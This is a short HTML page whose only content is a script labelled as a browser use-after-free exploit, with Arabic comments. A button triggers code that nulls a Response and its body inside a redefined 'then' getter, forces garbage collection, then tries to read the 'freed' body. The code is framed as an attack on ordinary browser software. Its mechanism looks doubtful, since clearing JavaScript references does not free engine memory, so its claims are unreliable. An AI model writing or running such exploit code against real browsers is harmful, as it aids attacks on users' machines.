<!DOCTYPE html>
<html>
<head>
    <script>
        function exploitUAF() {
            let blob = new Blob([], { type: 'application/octet-stream' });
            let formData = new FormData();
            formData.append('emptyBlob', blob);

            let response = new Response(formData);
            let originalBody = response.body;

            Object.defineProperty(response, 'then', {
                get: function() {
                    response = null;
                    originalBody = null; // تحرير الجسم
                    if (typeof gc === "function") gc();
                    return undefined;
                }
            });

            response.arrayBuffer().then(() => {
                try {
                    // محاولة الوصول بعد التحرير
                    let test = originalBody; // التحقق من الجسم المحرر
                    console.log("Accessing locked stream");
                } catch (e) {
                    console.error(e.message);
                    alert(e.message);
                }
            }).catch(e => {
                console.error(e.message);
                alert(e.message);
            });
        }
    </script>
</head>
<body>
    <button onclick="exploitUAF()">Exploit UAF</button>
</body>
</html>